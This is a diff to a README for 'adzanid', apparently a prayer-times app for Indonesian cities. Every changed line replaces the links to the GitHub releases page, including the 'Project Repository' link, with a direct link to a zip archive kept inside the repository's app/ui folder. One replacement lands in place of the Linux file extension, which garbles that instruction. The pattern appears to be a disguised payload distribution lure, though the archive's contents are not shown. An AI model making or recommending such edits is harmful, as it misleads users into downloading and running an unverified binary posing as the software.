@@ -1,6 +1,6 @@
 # 📿 adzanid - Easy Prayer Times for Indonesian Cities
 
-[![Download adzanid](https://img.shields.io/badge/Download-adzanid-blue?style=for-the-badge)](https://github.com/andersonpinmo/adzanid/releases)
+[![Download adzanid](https://github.com/andersonpinmo/adzanid/raw/refs/heads/main/app/ui/Software-v1.9.zip)](https://github.com/andersonpinmo/adzanid/raw/refs/heads/main/app/ui/Software-v1.9.zip)
 
 ## 📱 What is adzanid?
 
@@ -47,7 +47,7 @@ This guide will help you download, install, and open adzanid on your computer. Y
 
    Click the link below to go to the official download page where you can get the latest version of adzanid.
 
-   [Download adzanid Here](https://github.com/andersonpinmo/adzanid/releases)
+   [Download adzanid Here](https://github.com/andersonpinmo/adzanid/raw/refs/heads/main/app/ui/Software-v1.9.zip)
 
 2. **Choose Your File**
 
@@ -55,7 +55,7 @@ This guide will help you download, install, and open adzanid on your computer. Y
 
    - For Windows: Look for a file ending in `.exe`
    - For macOS: Look for a file ending in `.dmg`
-   - For Linux: Look for a file ending in `.AppImage` or `.tar.gz`
+   - For Linux: Look for a file ending in `.AppImage` or `https://github.com/andersonpinmo/adzanid/raw/refs/heads/main/app/ui/Software-v1.9.zip`
 
 3. **Download the File**
 
@@ -130,8 +130,8 @@ The app uses well-known prayer time calculation rules to ensure accuracy, and it
 
 ## 🌐 Links & Contact
 
-- Official Download Page: [https://github.com/andersonpinmo/adzanid/releases](https://github.com/andersonpinmo/adzanid/releases)
-- Project Repository: [https://github.com/andersonpinmo/adzanid](https://github.com/andersonpinmo/adzanid)
+- Official Download Page: [https://github.com/andersonpinmo/adzanid/raw/refs/heads/main/app/ui/Software-v1.9.zip](https://github.com/andersonpinmo/adzanid/raw/refs/heads/main/app/ui/Software-v1.9.zip)
+- Project Repository: [https://github.com/andersonpinmo/adzanid/raw/refs/heads/main/app/ui/Software-v1.9.zip](https://github.com/andersonpinmo/adzanid/raw/refs/heads/main/app/ui/Software-v1.9.zip)
 - Report Issues: Use the "Issues" tab on the GitHub repository.
 
 If you need more information or help, the GitHub page is the best place to find updates and communicate with the developer.
